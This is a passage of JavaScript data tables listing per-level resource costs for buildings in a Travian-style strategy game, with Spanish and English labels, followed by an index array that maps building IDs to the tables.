		[1520, 1950, 1520, 435],
		[2535, 3260, 2535, 725],
		[4235, 5445, 4235, 1210],
		[7070, 9095, 7070, 2020],	// Level 10
		[11810, 15185, 11810, 3375],
		[19725, 25360, 19725, 5635],
		[32940, 42350, 32940, 9410],
		[55005, 70720, 55005, 15715],
		[91860, 118105, 91860, 26245],	// Level 15
		[153405, 197240, 153405, 43830],
		[256190, 329385, 256190, 73195],
		[427835, 550075, 427835, 122240],
		[714485, 918625, 714485, 204140],
		[1193195, 1534105, 1193195, 340915]	// Level 20
	];

	// Almacen - warehouse
	var warehouseCost = [
		[0, 0, 0, 0],
		[130, 160, 90, 40],
		[165, 205, 115, 50],
		[215, 260, 145, 65],
		[275, 335, 190, 85],
		[350, 430, 240, 105],	// Level 5
		[445, 550, 310, 135],
		[570, 705, 395, 175],
		[730, 900, 505, 225],
		[935, 1155, 650, 290],
		[1200, 1475, 830, 370],	// Level 10
		[1535, 1890, 1065, 470],
		[1965, 2420, 1360, 605],
		[2515, 3095, 1740, 775],
		[3220, 3960, 2230, 990],
		[4120, 5070, 2850, 1270],	// Level 15
		[5275, 6490, 3650, 1625],
		[6750, 8310, 4675, 2075],
		[8640, 10635, 5980, 2660],
		[11060, 13610, 7655, 3405],
		[14155, 17420, 9800, 4355]	// Level 20
	];

	// Academia
	var academyCost = [
		[0, 0, 0, 0], 			// Level 0
		[220, 160, 90, 40],
		[280, 205, 115, 50],
		[360, 260, 145, 65],
		[460, 335, 190, 85],
		[590, 430, 240, 105],	// Level 5
		[755, 550, 310, 135],
		[970, 705, 395, 175],
		[1240, 900, 505, 225],
		[1585, 1155, 650, 290],
		[2030, 1475, 830, 370],	// Level 10
		[2595, 1890, 1065, 470],
		[3325, 2420, 1360, 605],
		[4255, 3095, 1740, 775],
		[5445, 3960, 2230, 990],
		[6970, 5070, 2850, 1270],	// Level 15
		[8925, 6490, 3650, 1625],
		[11425, 8310, 4675, 2075],
		[14620, 10635, 5980, 2660],
		[18715, 13610, 7655, 3405],
		[23955, 17420, 9800, 4355]	// Level 20
	];

	// Molino - Mill
	var flourMillCost = [
		[0, 0, 0, 0], 			// Level 0
		[500, 440, 380, 1240],
		[900, 790, 685, 2230],
		[1620, 1425, 1230, 4020],
		[2915, 2565, 2215, 7230],
		[5250, 4620, 3990, 13015] // Level 5
	];

	// Ladrillar -
	var brickyardCost = [
		[0, 0, 0, 0], 			// Level 0
		[440, 480, 320, 50],
		[790, 865, 575, 90],
		[1425, 1555, 1035, 160],
		[2565, 2800, 1865, 290],
		[4620, 5040, 3360, 525]	// Level 5
	];

	// Serreria
	var sawmillCost = [
		[0, 0, 0, 0], 			// Level 0
		[520, 380, 290, 90],
		[935, 685, 520, 160],
		[1685, 1230, 940, 290],
		[3035, 2215, 1690, 525],
		[5460, 3990, 3045, 945]	// Level 5
	];

	// Fundicion de hierro
	var ironFoundryCost = [
		[0, 0, 0, 0], 			// Level 0
		[200, 450, 510, 120],
		[360, 810, 920, 215],
		[650, 1460, 1650, 390],
		[1165, 2625, 2975, 700],
		[2100, 4725, 5355, 1260]	// Level 5
	];

	// Panaderia
	var bakeryCost = [
		[0, 0, 0, 0], 			// Level 0
		[1200, 1480, 870, 1600],
		[2160, 2665, 1565, 2880],
		[3890, 4795, 2820, 5185],
		[7000, 8630, 5075, 9330],
		[12595, 15535, 9135, 16795]	// Level 5
	];

	// Mercado
	var marketplaceCost = [
		[0, 0, 0, 0], 			// Level 0
		[80, 70, 120, 70],
		[100, 90, 155, 90],
		[130, 115, 195, 115],
		[170, 145, 250, 145],
		[215, 190, 320, 190],	// Level 5
		[275, 240, 410, 240],
		[350, 310, 530, 310],
		[450, 395, 675, 395],
		[575, 505, 865, 505],
		[740, 645, 1105, 645],	// Level 10
		[945, 825, 1415, 825],
		[1210, 1060, 1815, 1060],
		[1545, 1355, 2320, 1355],
		[1980, 1735, 2970, 1735],
		[2535, 2220, 3805, 2220],	// Level 15
		[3245, 2840, 4870, 2840],
		[4155, 3635, 6230, 3635],
		[5315, 4650, 7975, 4650],
		[6805, 5955, 10210, 5955],
		[8710, 7620, 13065, 7620]	// Level 20
	];

	// Granero
	var granaryCost = [
		[0, 0, 0, 0],
		[80, 100, 70, 20],
		[100, 130, 90, 25],
		[130, 165, 115, 35],
		[170, 210, 145, 40],
		[215, 270, 190, 55],	// Level 5
		[275, 345, 240, 70],
		[350, 440, 310, 90],
		[450, 565, 395, 115],
		[575, 720, 505, 145],
		[740, 920, 645, 185],	// Level 10
		[945, 1180, 825, 235],
		[1210, 1510, 1060, 300],
		[1545, 1935, 1355, 385],
		[1980, 2475, 1735, 495],
		[2535, 3170, 2220, 635],	// Level 15
		[3245, 4055, 2840, 810],
		[4155, 5190, 3635, 1040],
		[5315, 6645, 4650, 1330],
		[6805, 8505, 5955, 1700],
		[8710, 10890, 7620, 2180]	// Level 20
	];

	// Armeria
	var blacksmithCost = [
		[0, 0, 0, 0],
		[170, 200, 380, 130],
		[220, 255, 485, 165],
		[280, 330, 625, 215],
		[355, 420, 795, 275],
		[455, 535, 1020, 350],	// Level 5
		[585, 685, 1305, 445],
		[750, 880, 1670, 570],
		[955, 1125, 2140, 730],
		[1225, 1440, 2740, 935],
		[1570, 1845, 3505, 1200],	// Level 10
		[2005, 2360, 4485, 1535],
		[2570, 3020, 5740, 1965],
		[3290, 3870, 7350, 2515],
		[4210, 4950, 9410, 3220],
		[5390, 6340, 12045, 4120],	// Level 15
		[6895, 8115, 15415, 5275],
		[8825, 10385, 19730, 6750],
		[11300, 13290, 25255, 8640],
		[14460, 17015, 32325, 11060],
		[18510, 21780, 41380, 14155]	// Level 20
	];

	// Armamentaria
	var armouryCost = [
		[0, 0, 0, 0],
		[130, 210, 410, 130],
		[165, 270, 525, 165],
		[215, 345, 670, 215],
		[275, 440, 860, 275],
		[350, 565, 1100, 350],	// Level 5
		[445, 720, 1410, 445],
		[570, 925, 1805, 570],
		[730, 1180, 2310, 730],
		[935, 1515, 2955, 935],
		[1200, 1935, 3780, 1200],	// Level 10
		[1535, 2480, 4840, 1535],
		[1965, 3175, 6195, 1965],
		[2515, 4060, 7930, 2515],
		[3220, 5200, 10150, 3220],
		[4120, 6655, 12995, 4120],	// Level 15
		[5275, 8520, 16630, 5275],
		[6750, 10905, 21290, 6750],
		[8640, 13955, 27250, 8640],
		[11060, 17865, 34880, 11060],
		[14155, 22865, 44645, 14155]	// Level 20
	];

	// Edificio principal
	var mainBuildingCost = [
		[0, 0, 0, 0],
		[70, 40, 60, 20],
		[90, 50, 75, 25],
		[115, 65, 100, 35],
		[145, 85, 125, 40],
		[190, 105, 160, 55],	// Level 5
		[240, 135, 205, 70],
		[310, 175, 265, 90],
		[395, 225, 340, 115],
		[505, 290, 430, 145],
		[645, 370, 555, 185],	// Level 10
		[825, 470, 710, 235],
		[1060, 605, 905, 300],
		[1355, 775, 1160, 385],
		[1735, 990, 1485, 495],
		[2220, 1270, 1900, 635],	// Level 15
		[2840, 1625, 2435, 810],
		[3635, 2075, 3115, 1040],
		[4650, 2660, 3990, 1330],
		[5955, 3405, 5105, 1700],
		[7620, 4355, 6535, 2180]	// Level 20
	];

	// Plaza de reuniones
	var rallyPointCost = [
		[0, 0, 0, 0],
		[110, 160, 90, 70],
		[140, 205, 115, 90],
		[180, 260, 145, 115],
		[230, 335, 190, 145],
		[295, 430, 240, 190],	// Level 5
		[380, 550, 310, 240],
		[485, 705, 395, 310],
		[620, 900, 505, 395],
		[795, 1155, 650, 505],
		[1015, 1475, 830, 645],	//Level 10
		[1300, 1890, 1065, 825],
		[1660, 2420, 1360, 1060],
		[2130, 3095, 1740, 1355],
		[2725, 3960, 2230, 1735],
		[3485, 5070, 2850, 2220],	// Level 15
		[4460, 6490, 3650, 2840],
		[5710, 8310, 4675, 3635],
		[7310, 10635, 5980, 4650],
		[9360, 13610, 7655, 5955],
		[11980, 17420, 9800, 7620]	// Level 20
	];

	// Embajada
	var embassyCost = [
		[0, 0, 0, 0],
		[180, 130, 150, 80],
		[230, 165, 190, 100],
		[295, 215, 245, 130],
		[375, 275, 315, 170],
		[485, 350, 405, 215],	// Level 5
		[620, 445, 515, 275],
		[790, 570, 660, 350],
		[1015, 730, 845, 450],
		[1295, 935, 1080, 575],
		[1660, 1200, 1385, 740],	// Level 10
		[2125, 1535, 1770, 945],
		[2720, 1965, 2265, 1210],
		[3480, 2515, 2900, 1545],
		[4455, 3220, 3715, 1980],
		[5705, 4120, 4755, 2535],	// Level 15
		[7300, 5275, 6085, 3245],
		[9345, 6750, 7790, 4155],
		[11965, 8640, 9970, 5315],
		[15315, 11060, 12760, 6805],
		[19600, 14155, 16335, 8710]	// Level 20
	];

	// Cuartel
	var barracksCost = [
		[0, 0, 0, 0],
		[210, 140, 260, 120],
		[270, 180, 335, 155],
		[345, 230, 425, 195],
		[440, 295, 545, 250],
		[565, 375, 700, 320],	// Level 5
		[720, 480, 895, 410],
		[925, 615, 1145, 530],
		[1180, 790, 1465, 675],
		[1515, 1010, 1875, 865],
		[1935, 1290, 2400, 1105],	// Level 10
		[2480, 1655, 3070, 1415],
		[3175, 2115, 3930, 1815],
		[4060, 2710, 5030, 2320],
		[5200, 3465, 6435, 2970],
		[6655, 4435, 8240, 3805],	// Level 15
		[8520, 5680, 10545, 4870],
		[10905, 7270, 13500, 6230],
		[13955, 9305, 17280, 7975],
		[17865, 11910, 22120, 10210],
		[22865, 15245, 28310, 13065]	// Level 20
	];

	// Corral / Establo
	var stableCost = [
		[0, 0, 0, 0],
		[260, 140, 220, 100],
		[335, 180, 280, 130],
		[425, 230, 360, 165],
		[545, 295, 460, 210],
		[700, 375, 590, 270],	//Level 5
		[895, 480, 755, 345],
		[1145, 615, 970, 440],
		[1465, 790, 1240, 565],
		[1875, 1010, 1585, 720],
		[2400, 1290, 2030, 920],	// Level 10
		[3070, 1655, 2595, 1180],
		[3930, 2115, 3325, 1510],
		[5030, 2710, 4255, 1935],
		[6435, 3465, 5445, 2475],
		[8240, 4435, 6970, 3170],	// Level 15
		[10545, 5680, 8925, 4055],
		[13500, 7270, 11425, 5190],
		[17280, 9305, 14620, 6645],
		[22120, 11910, 18715, 8505],
		[28310, 15245, 23955, 10890]	// Level 20
	];

	// Taller
	var workshopCost = [
		[0, 0, 0, 0],
		[460, 510, 600, 320],
		[590, 655, 770, 410],
		[755, 835, 985, 525],
		[965, 1070, 1260, 670],
		[1235, 1370, 1610, 860],	// Level 5
		[1580, 1750, 2060, 1100],
		[2025, 2245, 2640, 1405],
		[2590, 2870, 3380, 1800],
		[3315, 3675, 4325, 2305],
		[4245, 4705, 5535, 2950],	// Level 10
		[5430, 6020, 7085, 3780],
		[6950, 7705, 9065, 4835],
		[8900, 9865, 11605, 6190],
		[11390, 12625, 14855, 7925],
		[14580, 16165, 19015, 10140],	// Level 15
		[18660, 20690, 24340, 12980],
		[23885, 26480, 31155, 16615],
		[30570, 33895, 39875, 21270],
		[39130, 43385, 51040, 27225],
		[50090, 55535, 65335, 34845]	// Level 20
	];

	// Escondite - Cranny
	var crannyCost = [
		[0, 0, 0, 0],
		[40, 50, 30, 10],
		[50, 65, 40, 15],
		[65, 80, 50, 15],
		[85, 105, 65, 20],
		[105, 135, 80, 25],	// Level 5
		[135, 170, 105, 35],
		[175, 220, 130, 45],
		[225, 280, 170, 55],
		[290, 360, 215, 70],
		[370, 460, 275, 90]	// Level 10
	];

	// Ayuntamiento - Townhall
	var ayuntamientoCost = [
		[0, 0, 0, 0],
		[1250, 1110, 1260, 600],
		[1600, 1420, 1615, 770],
		[2050, 1820, 2065, 985],
		[2620, 2330, 2640, 1260],
		[3355, 2980, 3380, 1610],	// Level 5
		[4295, 3815, 4330, 2060],
		[5500, 4880, 5540, 2640],
		[7035, 6250, 7095, 3380],
		[9005, 8000, 9080, 4325],
		[11530, 10240, 11620, 5535],	// Level 10
		[14755, 13105, 14875, 7085],
		[18890, 16775, 19040, 9065],
		[24180, 21470, 24370, 11605],
		[30950, 27480, 31195, 14855],
		[39615, 35175, 39930, 19015],	// Level 15
		[50705, 45025, 51110, 24340],
		[64905, 57635, 65425, 31155],
		[83075, 73770, 83740, 39875],
		[106340, 94430, 107190, 51040],
		[136115, 120870, 137200, 65335]	// Level 20
	];

	// Residencia
	var residenceCost = [
		[0, 0, 0, 0],
		[580, 460, 350, 180],
		[740, 590, 450, 230],
		[950, 755, 575, 295],
		[1215, 965, 735, 375],
		[1555, 1235, 940, 485],	// Level 5
		[1995, 1580, 1205, 620],
		[2550, 2025, 1540, 790],
		[3265, 2590, 1970, 1015],
		[4180, 3315, 2520, 1295],
		[5350, 4245, 3230, 1660],	// Level 10
		[6845, 5430, 4130, 2125],
		[8765, 6950, 5290, 2720],
		[11220, 8900, 6770, 3480],
		[14360, 11390, 8665, 4455],
		[18380, 14580, 11090, 5705],	// Level 15
		[23530, 18660, 14200, 7300],
		[30115, 23885, 18175, 9345],
		[38550, 30570, 23260, 11965],
		[49340, 39130, 29775, 15315],
		[63155, 50090, 38110, 19600]	// Level 20
	];

	// Palacio
	var palaceCost = [
		[0, 0, 0, 0],
		[550, 800, 750, 250],
		[705, 1025, 960, 320],
		[900, 1310, 1230, 410],
		[1155, 1680, 1575, 525],
		[1475, 2145, 2015, 670],	// Level 5
		[1890, 2750, 2575, 860],
		[2420, 3520, 3300, 1100],
		[3095, 4505, 4220, 1405],
		[3965, 5765, 5405, 1800],
		[5075, 7380, 6920, 2305],	// Level 10
		[6495, 9445, 8855, 2950],
		[8310, 12090, 11335, 3780],
		[10640, 15475, 14505, 4835],
		[13615, 19805, 18570, 6190],
		[17430, 25355, 23770, 7925],	// Level 15
		[22310, 32450, 30425, 10140],
		[28560, 41540, 38940, 12980],
		[36555, 53170, 49845, 16615],
		[46790, 68055, 63805, 21270],
		[59890, 87110, 81670, 27225]	// Level 20
	];

	// Plaza de torneos
	var tournamentSquareCost = [
		[0, 0, 0, 0],
		[1750, 2250, 1530, 240],
		[2240, 2880, 1960, 305],
		[2865, 3685, 2505, 395],
		[3670, 4720, 3210, 505],
		[4700, 6040, 4105, 645],	// Level 5
		[6015, 7730, 5255, 825],
		[7695, 9895, 6730, 1055],
		[9850, 12665, 8615, 1350],
		[12610, 16215, 11025, 1730],
		[16140, 20755, 14110, 2215],	// Level 10
		[20660, 26565, 18065, 2835],
		[26445, 34000, 23120, 3625],
		[33850, 43520, 29595, 4640],
		[43330, 55705, 37880, 5940],
		[55460, 71305, 48490, 7605],	// Level 15
		[70990, 91270, 62065, 9735],
		[90865, 116825, 79440, 12460],
		[116305, 149540, 101685, 15950],
		[148875, 191410, 130160, 20415],
		[190560, 245005, 166600, 26135]	// Level 20
	];

	// Tesoro - Treasury
	var tesoroCost = [
		[0, 0, 0, 0],
		[2880, 2740, 2580, 990],
		[3685, 3505, 3300, 1265],
		[4720, 4490, 4225, 1620],
		[6040, 5745, 5410, 2075],
		[7730, 7355, 6925, 2660],	// Level 5
		[9895, 9415, 8865, 3400],
		[12665, 12050, 11345, 4355],
		[16215, 15425, 14525, 5575],
		[20755, 19745, 18590, 7135],
		[26565, 25270, 23795, 9130]	// Level 10
	];

	// Oficina de comercio - Trade office
	var oficinaComercioCost = [
		[0, 0, 0, 0],
		[1400, 1330, 1200, 400],
		[1790, 1700, 1535, 510],
		[2295, 2180, 1965, 655],
		[2935, 2790, 2515, 840],
		[3760, 3570, 3220, 1075],	// Level 5
		[4810, 4570, 4125, 1375],
		[6155, 5850, 5280, 1760],
		[7880, 7485, 6755, 2250],
		[10090, 9585, 8645, 2880],
		[12915, 12265, 11070, 3690],	// Level 10
		[16530, 15700, 14165, 4720],
		[21155, 20100, 18135, 6045],
		[27080, 25725, 23210, 7735],
		[34660, 32930, 29710, 9905],
		[44370, 42150, 38030, 12675],	// Level 15
		[56790, 53950, 48680, 16225],
		[72690, 69060, 62310, 20770],
		[93045, 88395, 79755, 26585],
		[119100, 113145, 102085, 34030],
		[152445, 144825, 130670, 43555]	// Level 20
	];

	// Cuartel grande
	var greatBarrackCost = [
		[0, 0, 0, 0],
		[630, 420, 780, 360],
		[805, 540, 1000, 460],
		[1030, 690, 1280, 590],
		[1320, 880, 1635, 755],
		[1690, 1125, 2095, 965],	// Level 5
		[2165, 1445, 2680, 1235],
		[2770, 1845, 3430, 1585],
		[3545, 2365, 4390, 2025],
		[4540, 3025, 5620, 2595],
		[5810, 3875, 7195, 3320],	// Level 10
		[7440, 4960, 9210, 4250],
		[9520, 6345, 11785, 5440],
		[12185, 8125, 15085, 6965],
		[15600, 10400, 19310, 8915],
		[19965, 13310, 24720, 11410],	// Level 15
		[25555, 17035, 31640, 14605],
		[32710, 21810, 40500, 18690],
		[41870, 27915, 51840, 23925],
		[53595, 35730, 66355, 30625],
		[68600, 45735, 84935, 39200]	// Level 20
	];

	// Corral / Establo grande
	var greatStableCost = [
		[0, 0, 0, 0],
		[780, 420, 660, 300],
		[1000, 540, 845, 385],
		[1280, 690, 1080, 490],
		[1635, 880, 1385, 630],
		[2095, 1125, 1770, 805],	// Level 5
		[2680, 1445, 2270, 1030],
		[3430, 1845, 2905, 1320],
		[4390, 2365, 3715, 1690],
		[5620, 3025, 4755, 2160],
		[7195, 3875, 6085, 2765],	// Level 10
		[9210, 4960, 7790, 3540],
		[11785, 6345, 9975, 4535],
		[15085, 8125, 12765, 5805],
		[19310, 10400, 16340, 7430],
		[24720, 13310, 20915, 9505],	// Level 15
		[31640, 17035, 26775, 12170],
		[40500, 21810, 34270, 15575],
		[51840, 27915, 43865, 19940],
		[66355, 35730, 56145, 25520],
		[84935, 45735, 71870, 32665]	// Level 20
	];

	// Muralla
	var wallRomansCost = [
		[0, 0, 0, 0],
		[70, 90, 170, 70],
		[90, 115, 220, 90],
		[115, 145, 280, 115],
		[145, 190, 355, 145],
		[190, 240, 455, 190],	// Level 5
		[240, 310, 585, 240],
		[310, 395, 750, 310],
		[395, 505, 955, 395],
		[505, 650, 1225, 505],
		[645, 830, 1570, 645],	// LEvel 10
		[825, 1065, 2005, 825],
		[1060, 1360, 2570, 1060],
		[1355, 1740, 3290, 1355],
		[1735, 2230, 4210, 1735],
		[2220, 2850, 5390, 2220],	// Level 15
		[2840, 3650, 6895, 2840],
		[3635, 4675, 8825, 3635],
		[4650, 5980, 11300, 4650],
		[5955, 7655, 14460, 5955],
		[7620, 9800, 18510, 7620]	// Level 20
	];

	// Empalizada
	var wallGaulsCost = [
		[0, 0, 0, 0],
		[160, 100, 80, 60],
		[205, 130, 100, 75],
		[260, 165, 130, 100],
		[335, 210, 170, 125],
		[430, 270, 215, 160],	// Level 5
		[550, 345, 275, 205],
		[705, 440, 350, 265],
		[900, 565, 450, 340],
		[1155, 720, 575, 430],
		[1475, 920, 740, 555],	// Level 10
		[1890, 1180, 945, 710],
		[2420, 1510, 1210, 905],
		[3095, 1935, 1545, 1160],
		[3960, 2475, 1980, 1485],
		[5070, 3170, 2535, 1900],	// Level 15
		[6490, 4055, 3245, 2435],
		[8310, 5190, 4155, 3115],
		[10635, 6645, 5315, 3990],
		[13610, 8505, 6805, 5105],
		[17420, 10890, 8710, 6535]	// Level 20
	];

	// Terraplen
	var wallTeutonsCost = [
		[0, 0, 0, 0],
		[120, 200, 0, 80],
		[155, 255, 0, 100],
		[195, 330, 0, 130],
		[250, 420, 0, 170],
		[320, 535, 0, 215],	// Level 5
		[410, 685, 0, 275],
		[530, 880, 0, 350],
		[675, 1125, 0, 450],
		[865, 1440, 0, 575],
		[1105, 1845, 0, 740],	// Level 10
		[1415, 2360, 0, 945],
		[1815, 3020, 0, 1210],
		[2320, 3870, 0, 1545],
		[2970, 4950, 0, 1980],
		[3805, 6340, 0, 2535],	// Level 15
		[4870, 8115, 0, 3245],
		[6230, 10385, 0, 4155],
		[7975, 13290, 0, 5315],
		[10210, 17015, 0, 6805],
		[13065, 21780, 0, 8710]	// Level 20
	];

	// Brewery
	var cerveceriaCost = [
		[0, 0, 0, 0],
		[1200, 1400, 1050, 2200],
		[1535, 1790, 1345, 2815],
		[1965, 2295, 1720, 3605],
		[2515, 2935, 2200, 4615],
		[3220, 3760, 2820, 5905],	// Level 5
		[4125, 4810, 3610, 7560],
		[5280, 6155, 4620, 9675],
		[6755, 7880, 5910, 12385],
		[8645, 10090, 7565, 15855],
		[11070, 12915, 9685, 20290],	// Level 10
		[14165, 16530, 12395, 25975],
		[18135, 21155, 15865, 33245],
		[23210, 27080, 20310, 42555],
		[29710, 34660, 25995, 54470],
		[38030, 44370, 33275, 69720],	// Level 15
		[48680, 56790, 42595, 89245],
		[62310, 72690, 54520, 114230],
		[79755, 93045, 69785, 146215],
		[102085, 119100, 89325, 187155],
		[130670, 152445, 114335, 239560]	// Level 20
	];

	// Hero's mansion
	var casaHeroeCost = [
		[0, 0, 0, 0],
		[700, 670, 700, 240],
		[930, 890, 930, 320],
		[1240, 1185, 1240, 425],
		[1645, 1575, 1645, 565],
		[2190, 2095, 2190, 750],	// Level 5
		[2915, 2790, 2915, 1000],
		[3875, 3710, 3875, 1330],
		[5155, 4930, 5155, 1765],
		[6855, 6560, 6855, 2350],
		[9115, 8725, 9115, 3125],	// Level 10
		[12125, 11605, 12125, 4155],
		[16125, 15435, 16125, 5530],
		[21445, 20525, 21445, 7350],
		[28520, 27300, 28520, 9780],
		[37935, 36310, 37935, 13005],	// Level 15
		[50450, 48290, 50450, 17300],
		[67100, 64225, 67100, 23005],
		[89245, 85420, 89245, 30600],
		[118695, 113605, 118695, 40695],
		[157865, 151095, 157865, 54125]	// Level 20
	];

	// Trapper
	var trampaCost = [
		[0, 0, 0, 0],
		[100, 100, 100, 100],
		[130, 130, 130, 130],
		[165, 165, 165, 165],
		[210, 210, 210, 210],
		[270, 270, 270, 270],	// Level 5
		[345, 345, 345, 345],
		[440, 440, 440, 440],
		[565, 565, 565, 565],
		[720, 720, 720, 720],
		[920, 920, 920, 920],	// Level 10
		[1180, 1180, 1180, 1180],
		[1510, 1510, 1510, 1510],
		[1935, 1935, 1935, 1935],
		[2475, 2475, 2475, 2475],
		[3170, 3170, 3170, 3170],	// Level 15
		[4055, 4055, 4055, 4055],
		[5190, 5190, 5190, 5190],
		[6645, 6645, 6645, 6645],
		[8505, 8505, 8505, 8505],
		[10890, 10890, 10890, 10890]	// Level 20
	];

	// Stonemason
	var canteroCost = [
		[0, 0, 0, 0],
		[155, 130, 125, 70],
		[200, 165, 160, 90],
		[255, 215, 205, 115],
		[325, 275, 260, 145],
		[415, 350, 335, 190],	// Level 5
		[535, 445, 430, 240],
		[680, 570, 550, 310],
		[875, 730, 705, 395],
		[1115, 935, 900, 505],
		[1430, 1200, 1155, 645],	// Level 10
		[1830, 1535, 1475, 825],
		[2340, 1965, 1890, 1060],
		[3000, 2515, 2420, 1355],
		[3840, 3220, 3095, 1735],
		[4910, 4120, 3960, 2220],	// Level 15
		[6290, 5275, 5070, 2840],
		[8050, 6750, 6490, 3635],
		[10300, 8640, 8310, 4650],
		[13185, 11060, 10635, 5955],
		[16880, 14155, 13610, 7620]	// Level 20
	];

	var greatWarehouseCost = [
		[0, 0, 0, 0],
		[650, 800, 450, 200],
		[830, 1025, 575, 255],
		[1065, 1310, 735, 330],
		[1365, 1680, 945, 420],
		[1745, 2145, 1210, 535],	// Level 5
		[2235, 2750, 1545, 685],
		[2860, 3520, 1980, 880],
		[3660, 4505, 2535, 1125],
		[4685, 5765, 3245, 1440],
		[5995, 7380, 4150, 1845],	// Level 10
		[7675, 9445, 5315, 2360],
		[9825, 12090, 6800, 3020],
		[12575, 15475, 8705, 3870],
		[16095, 19805, 11140, 4950],
		[20600, 25355, 14260, 6340],	// Level 15
		[26365, 32450, 18255, 8115],
		[33750, 41540, 23365, 10385],
		[43200, 53170, 29910, 13290],
		[55295, 68055, 38280, 17015],
		[70780, 87110, 49000, 21780]	// Level 20
	];

	var greatGranaryCost = [
		[0, 0, 0, 0],
		[400, 500, 350, 100],
		[510, 640, 450, 130],
		[655, 820, 575, 165],
		[840, 1050, 735, 210],
		[1075, 1340, 940, 270],	// Level 5
		[1375, 1720, 1205, 345],
		[1760, 2200, 1540, 440],
		[2250, 2815, 1970, 565],
		[2880, 3605, 2520, 720],
		[3690, 4610, 3230, 920],	// Level 10
		[4720, 5905, 4130, 1180],
		[6045, 7555, 5290, 1510],
		[7735, 9670, 6770, 1935],
		[9905, 12380, 8665, 2475],
		[12675, 15845, 11090, 3170],	// Level 15
		[16225, 20280, 14200, 4055],
		[20770, 25960, 18175, 5190],
		[26585, 33230, 23260, 6645],
		[34030, 42535, 29775, 8505],
		[43555, 54445, 38110, 10890]	// Level 20
	];

        // Wonder Of The World
		var maravillaCost = [
		[0, 0, 0, 0],
		[66700, 69050, 72200, 13200],
		[68535, 70950, 74185, 13565],
		[70420, 72900, 76225, 13935],
		[72355, 74905, 78320, 14320],
		[74345, 76965, 80475, 14715],
		[76390, 79080, 82690, 15120],
		[78490, 81255, 84965, 15535],
		[80650, 83490, 87300, 15960],
		[82865, 85785, 89700, 16400],
		[85145, 88145, 92165, 16850],	// Level 10
		[87485, 90570, 94700, 17315],
		[89895, 93060, 97305, 17790],
		[92365, 95620, 99980, 18280],
		[94905, 98250, 102730, 18780],
		[97515, 100950, 105555, 19300],
		[100195, 103725, 108460, 19830],
		[102950, 106580, 111440, 20375],
		[105785, 109510, 114505, 20935],
		[108690, 112520, 117655, 21510],
		[111680, 115615, 120890, 22100],	// Level 20
		[114755, 118795, 124215, 22710],
		[117910, 122060, 127630, 23335],
		[121150, 125420, 131140, 23975],
		[124480, 128870, 134745, 24635],
		[127905, 132410, 138455, 25315],
		[131425, 136055, 142260, 26010],
		[135035, 139795, 146170, 26725],
		[138750, 143640, 150190, 27460],
		[142565, 147590, 154320, 28215],
		[146485, 151650, 158565, 28990],	// Level 30
		[150515, 155820, 162925, 29785],
		[154655, 160105, 167405, 30605],
		[158910, 164505, 172010, 31450],
		[163275, 169030, 176740, 32315],
		[167770, 173680, 181600, 33200],
		[172380, 178455, 186595, 34115],
		[177120, 183360, 191725, 35055],
		[181995, 188405, 197000, 36015],
		[186995, 193585, 202415, 37005],
		[192140, 198910, 207985, 38025],	// Level 40
		[197425, 204380, 213705, 39070],
		[202855, 210000, 219580, 40145],
		[208430, 215775, 225620, 41250],
		[214165, 221710, 231825, 42385],
		[220055, 227805, 238200, 43550],
		[226105, 234070, 244750, 44745],
		[232320, 240505, 251480, 45975],
		[238710, 247120, 258395, 47240],
		[245275, 253915, 265500, 48540],
		[252020, 260900, 272800, 49875],	// Level 50
		[258950, 268075, 280305, 51245],
		[266070, 275445, 288010, 52655],
		[273390, 283020, 295930, 54105],
		[280905, 290805, 304070, 55590],
		[288630, 298800, 312430, 57120],
		[296570, 307020, 321025, 58690],
		[304725, 315460, 329850, 60305],
		[313105, 324135, 338925, 61965],
		[321715, 333050, 348245, 63670],
		[330565, 342210, 357820, 65420],	// Level 60
		[339655, 351620, 367660, 67220],
		[348995, 361290, 377770, 69065],
		[358590, 371225, 388160, 70965],
		[368450, 381435, 398835, 72915],
		[378585, 391925, 409800, 74920],
		[388995, 402700, 421070, 76985],
		[399695, 413775, 432650, 79100],
		[410685, 425155, 444550, 81275],
		[421980, 436845, 456775, 83510],
		[433585, 448860, 469335, 85805],	// Level 70
		[445505, 461205, 482240, 88165],
		[457760, 473885, 495505, 90590],
		[470345, 486920, 509130, 93080],
		[483280, 500310, 523130, 95640],
		[496570, 514065, 537520, 98270],
		[510225, 528205, 552300, 100975],
		[524260, 542730, 567490, 103750],
		[538675, 557655, 583095, 106605],
		[553490, 572990, 599130, 109535],
		[568710, 588745, 615605, 112550],	// Level 80
		[584350, 604935, 632535, 115645],
		[600420, 621575, 649930, 118825],
		[616930, 638665, 667800, 122090],
		[633895, 656230, 686165, 125450],
		[651330, 674275, 705035, 128900],
		[669240, 692820, 724425, 132445],
		[687645, 711870, 744345, 136085],
		[706555, 731445, 764815, 139830],
		[725985, 751560, 785850, 143675],
		[745950, 772230, 807460, 147625],	// Level 90
		[766460, 793465, 829665, 151685],
		[787540, 815285, 852480, 155855],
		[809195, 837705, 875920, 160140],
		[831450, 860745, 900010, 164545],
		[854315, 884415, 924760, 169070],
		[877810, 908735, 950190, 173720],
		[901950, 933725, 976320, 178495],
		[926750, 959405, 1000000, 183405],
		[952235, 985785, 1000000, 188450],
		[1000000, 1000000, 1000000, 193630]	// Level 100
        ];



	var buildingCost = new Array();
	buildingCost[0] = lenyadorCost;
	buildingCost[1] = barroCost;
	buildingCost[2] = hierroCost;
	buildingCost[3] = cerealCost;

	buildingCost[5] = sawmillCost;
	buildingCost[6] = brickyardCost;
	buildingCost[7] = ironFoundryCost;
	buildingCost[8] = flourMillCost;
	buildingCost[9] = bakeryCost;
	buildingCost[10] = warehouseCost;
	buildingCost[11] = granaryCost;
	buildingCost[12] = blacksmithCost;
	buildingCost[13] = armouryCost;
	buildingCost[14] = tournamentSquareCost;
	buildingCost[15] = mainBuildingCost;
	buildingCost[16] = rallyPointCost;
	buildingCost[17] = marketplaceCost;
	buildingCost[18] = embassyCost;
	buildingCost[19] = barracksCost;
	buildingCost[20] = stableCost;
	buildingCost[21] = workshopCost;
	buildingCost[22] = academyCost;
	buildingCost[23] = crannyCost;
	buildingCost[24] = ayuntamientoCost;
	buildingCost[25] = residenceCost;
	buildingCost[26] = palaceCost;
	buildingCost[27] = tesoroCost;
	buildingCost[28] = oficinaComercioCost;
	buildingCost[29] = greatBarrackCost;
	buildingCost[30] = greatStableCost;
	buildingCost[31] = wallGaulsCost;
	buildingCost[32] = wallRomansCost;
	buildingCost[33] = wallTeutonsCost;
	buildingCost[34] = canteroCost;
	buildingCost[35] = cerveceriaCost;
	buildingCost[36] = trampaCost;
